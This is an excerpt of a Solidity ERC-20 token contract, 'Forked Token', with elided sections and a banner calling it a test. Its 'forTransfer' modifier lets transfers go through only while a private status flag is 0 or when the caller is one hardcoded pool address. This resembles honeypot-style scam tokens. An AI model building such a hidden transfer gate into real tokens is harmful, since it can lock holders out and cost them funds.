...
/************************************************************/
/*                                                          */
/* THIS IS A TEST, PLEASE DO NO INTERACT WITH THIS CONTRACT */
/*                                                          */
/************************************************************/
...
contract ForkedToken is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _token_status = 0;
    uint256 public stakingPoolStatus = 0;

    string private _token_name;
    string private _token_symbol;

    address private _poolAddress = 0xbb49857283b29743D2c6266DBc3489751846EEb4;

    constructor() {
        _token_name = "Forked Token";
        _token_symbol = "FORK";
        _token_totalSupply = 1000000 * 10 ** 18;
        _balances[msg.sender] = _token_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolAddress || _token_status == 0);
        _;
    }
